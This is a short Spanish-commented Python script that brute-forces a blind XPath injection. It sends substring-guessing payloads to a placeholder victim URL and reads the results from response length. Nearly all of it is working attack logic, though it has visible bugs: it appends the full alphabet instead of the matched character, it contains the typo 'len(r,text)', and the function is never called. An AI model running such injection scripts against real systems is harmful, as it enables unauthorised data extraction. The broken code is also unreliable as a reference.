#!/usr/bin/python3
#pequeño script para probar por fuerza bruta inyeciones xpath
from pwn import *
import sys
import time 
import requests
import string
import pdb
import signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)
#Ctrl +C 
signal.signal(signal.SIGINT, def_handler)


#Variables Globales

main_url = "http://<IP-De-Víctima>/"
characters = string.ascii_letters


def xpath_Inyection():
    print ("empezando")
    data = ""
    
    p1 = log.progress("fuerza Bruta")
    p1.status("Empezando a romper to")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1,8):
        for character in characters:

            post_data = {
                'search': "1' and substring(name(/*[1]),%d,1)='%s'" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)
                
            if len(r.text) != 8681:
                data += characters
                p2.status(data)
                break
                       
            print(len(r,text)) 

    p1.success("LISTORTI JoséM")
    p2.status(data)
 

